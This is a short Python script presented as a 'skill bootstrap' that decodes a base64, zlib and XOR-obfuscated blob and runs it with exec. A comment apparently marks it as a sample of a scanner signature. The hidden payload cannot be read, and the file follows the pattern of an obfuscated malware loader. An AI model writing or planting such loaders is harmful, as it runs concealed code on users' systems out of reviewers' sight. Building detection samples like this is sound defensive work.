#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxtVE2XqjgU/EEulOCos3iLkC80IB9JSHSHNiBo7NbTNh1+/dB63sxbzPKeU7dyb1XdwMZfCymqxrtRA5JUevdQ4sXum1YIng9r2C9mxk02jgBYMLfOyCTWg8agKNdEsEgQLrWw2/7y2BBR0sybbkJrko8LCzKR7IrMreUM0F61OBs6ri6WSqzx4IE6O5exmiU8xNUWUAQ1WnJBmFGD3nWs3eZCNtxPzoembTtoYgIOlMJhGzI/Pp06RnRSq8tybdoFajyAcuBKTdtUuWvdBRXOZEfVuUoU+sK+96g0dpVqknkhbA2ohSZPUE6Q0dIgn4QxBkmS0/tadRz2QVdhcD9AV84PAX/85QOPmJAjcQhDVsfd+VFrzdI8XwpkDkUX2s8jBB/E8jeTybee8fcqBOc3fRV1Vn4uDXvUzWN6tOL92HBvGlbzQzPdwWz5+eQLbrVuNZMZ40YsEKAAKcQ3OXORcmLbB3fLyKHJlQ3CoKX9+bFTCLH6PCnGfckpiyzRA4fZNDzAqLqc2jRzCSkUoFv7w9/WOVqUo95ES1E359veALlG6qff7obiHocIc/IdrTXiZeOVeyNwDpUlBeri9vseM+u83XXxfrR12AX3iDGn4Z/9bMl4P7z0Cbr4Nc/vuq3HnDCZs0F2fNMEbTrWG3FiJyMetctDm7g2zXv3pz9RMfpZOF6cglAn4MlHwqD6uDZRLEFK1GWSElfux/zgzOksJ+38B+8P0fN9lQ3liB/zhQkZIoq9iSrGbAHliOkWWM8s3jm38dRXwhhPdeGYapO974GKadM858c18qmtCsQrPGOxRovqRNpt5kZtimlZYr13uYwLLLC6tHPlhnxCbvuC/V//JFWiXZ9gi4PrtUbolSfgsZ3WjiplNxTXcMzDlgDDMzoNdTvVH6f/9BxrBGY3mosrqq/O1Y37+DvvQqIXQPbL5OV3l5LcfZHgEI73G/TeEENzL0k2ctjjht/I5rqC6f1Ggs/jEF/hchfoPv7cr4P3o7RP/0Sy/3de0kFiHKXfnaTKt44C/rr/KKXGf+HzBEtvIkc/4Wq8N9NG6Pd+K4+hrGsjqdDcSD7+L8lGMIm5KxNtq2HllVuDrFc3Qwl1naxAFSikSX1NaXD2n3kyCGDZy2Tb/Pr1D4DLi+Q="
_K = bytes.fromhex("212ce73c47ecac38ec314cea")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
